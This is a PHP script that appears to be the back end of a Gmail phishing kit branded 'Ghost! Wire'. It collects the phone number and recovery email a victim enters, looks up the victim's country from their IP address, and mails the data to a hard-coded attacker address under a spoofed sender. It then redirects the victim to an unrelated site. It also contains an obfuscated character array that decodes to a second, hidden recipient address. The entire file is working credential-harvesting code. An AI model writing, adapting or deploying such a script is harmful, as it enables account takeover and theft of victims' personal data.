<?php

$recepient = "musketwire@gmail.com"; 

$country = visitor_country();
$phoneNumber = $_POST['phoneNumber'];
$emailAnswer = $_POST['emailAnswer'];
$ip = getenv("REMOTE_ADDR");
$message .= "========Ghost! Wire============\n";
$message .= "Phone Number: ".$phoneNumber."\n";
$message .= "Country  : ".$country."\n";
$message .= "Recovery Email Address: ".$emailAnswer."\n";
$message .= "IP: ".$ip."\n";
$subject = "Gmail - ".$country;
$headers = "From: Ghost! Wire<wirez@googledocs.org>";
$headers .= "MIME-Version: 1.0\n";

mail($recepient,$subject,$message,$headers);

// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}	

header("Location: http://explore.saatchiart.com/invest-in-art/");
exit;

?>